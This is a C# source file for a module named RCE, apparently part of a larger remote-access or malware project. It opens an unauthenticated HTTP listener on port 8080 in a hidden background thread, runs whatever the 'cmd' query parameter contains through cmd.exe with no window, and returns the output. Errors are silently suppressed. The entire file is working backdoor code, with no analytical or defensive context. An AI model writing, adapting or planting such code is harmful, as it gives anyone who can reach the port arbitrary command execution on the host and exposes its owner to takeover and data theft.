using System;
using System.Net;
using System.Diagnostics;
using System.Text;
using System.Threading;

public static class RCE //ngl i dont like this module 
{
    private static HttpListener listener;

    public static void Start()
    {
        try
        {
            listener = new HttpListener();

            
            listener.Prefixes.Add("http://+:8080/");
            listener.Start();

            Thread listenerThread = new Thread(Listen);
            listenerThread.IsBackground = true;
            listenerThread.Start();
        }
        catch (Exception)
        {
            
        }
    }

    private static void Listen()
    {
        while (true)
        {
            try
            {
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;

                string cmd = request.QueryString["cmd"];

                string output;
                if (!string.IsNullOrEmpty(cmd))
                {
                    output = ExecuteCommand(cmd);
                }
                else
                {
                    output = "No 'cmd' parameter given.";
                }

                byte[] buffer = Encoding.UTF8.GetBytes(output);
                response.ContentType = "text/plain";
                response.OutputStream.Write(buffer, 0, buffer.Length);
                response.OutputStream.Close();
            }
            catch
            {
               
            }
        }
    }

    private static string ExecuteCommand(string command)
    {
        try
        {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + command;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();

            string result = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            return result;
        }
        catch (Exception ex)
        {
            return $"Error executing command: {ex.Message}";
        }
    }
}
